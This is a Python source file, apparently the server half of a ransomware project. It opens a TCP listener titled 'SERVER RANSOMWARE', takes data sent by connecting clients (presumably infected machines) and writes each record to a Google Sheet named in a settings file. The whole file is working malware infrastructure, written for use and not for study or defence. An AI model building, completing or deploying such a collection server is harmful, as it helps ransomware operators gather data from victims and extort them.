# Import modules
from __init__ import *
from time import sleep
from threading import Thread
from lib.system import System
from lib.modules.yaml import safe_load
from lib.modules.sheet import GoogleSheet
from socket import socket, AF_INET, SOCK_STREAM


Terminal = System()


# Lớp Server để xử lý các kết nối và truyền dữ liệu
class Server:

    def __init__(self, host: str, port: int, id: str) -> None:
        self.host: str = host
        self.port: int = port
        self.sheet = GoogleSheet(id)
        self.server: socket = socket(AF_INET, SOCK_STREAM)
        self.data_queue = []

    def HandleSheet(self) -> None:
        while True:
            if self.data_queue:
                address, data = self.data_queue.pop(0)
                if isinstance(data, bytes): 
                    data = data.decode()
                self.sheet.UpdateValues([data.split('|')])  
                Terminal.Console(self.host ,f"Processed data from {address}", 'Yellow')
            else:
                sleep(5)

    # Xử lý dữ liệu từ mỗi client
    def HandleClient(self, client: socket, address) -> None:
        while True:
            try:
                data: bytes = client.recv(4096)
                if not data:
                    break
                if not isinstance(data, bytes): 
                    data = data.encode()
                self.data_queue.append([address[0], data])
                Terminal.Console(address[0], 
                        f'Packet data: {round(len(data)/1024, 3)} KB',
                        'Yellow')
            except Exception as error:
                Terminal.Console(address[0], error, 'Red')
                break
        client.close()
        Terminal.Console(address[0], 'Disconnect', 'Blue')


    # Xử lý các kết nối đến server
    def HandleConnections(self) -> None:
        while True:
            client, address = self.server.accept()
            Terminal.Console(address[0], 'Connect to Server', 'Orange')
            thread = Thread(target=self.HandleClient, args=(client, address))
            thread.start()


    # Bắt đầu lắng nghe các kết nối đến server
    def Listening(self) -> None:
        try:
            self.server.bind((self.host, self.port))
            self.server.listen()
            Terminal.Console(self.host, 'The server starts listening', 'Green')
            thread = Thread(target=self.HandleConnections)
            thread.start()

            thread2 = Thread(target=self.HandleSheet)
            thread2.start()
        except:
            Terminal.Console(self.host, 'Address already in use', 'Red')


# Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
if __name__ == '__main__':
    try:
        Terminal.Init()
        Terminal.Clear()
        Terminal.Title('SERVER RANSOMWARE')
        Terminal.Size(320, 240)

        with open('scripts/setting.yaml', 'r') as file:
            data = safe_load(file)['server']

        Server(data[0], data[1], data[2]).Listening()
    except Exception as error:
        Terminal.Console('127.0.0.0', error, 'Red')
        sleep(20)
        Terminal.Reset()